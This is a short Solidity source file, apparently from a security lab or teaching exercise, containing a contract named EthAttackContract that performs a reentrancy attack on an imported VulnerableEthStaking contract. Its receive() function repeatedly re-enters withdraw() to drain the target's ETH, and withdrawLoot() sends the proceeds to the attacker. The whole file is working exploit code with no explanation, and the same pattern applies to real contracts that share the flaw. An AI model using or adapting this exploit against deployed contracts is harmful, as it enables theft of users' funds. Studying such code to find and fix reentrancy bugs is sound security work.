// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableEthStaking.sol";

contract EthAttackContract {
    VulnerableEthStaking public staking;
    address public owner;
    uint256 public attackAmount;

    constructor(address _staking) {
        staking = VulnerableEthStaking(payable(_staking));
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Send ETH to attack");
        require(
            address(staking).balance >= msg.value,
            "Target already drained"
        );

        attackAmount = msg.value;

        staking.stake{value: msg.value}();
        staking.withdraw();
    }

    receive() external payable {
        if (attackAmount > 0 && address(staking).balance >= attackAmount) {
            staking.withdraw();
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");

        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}
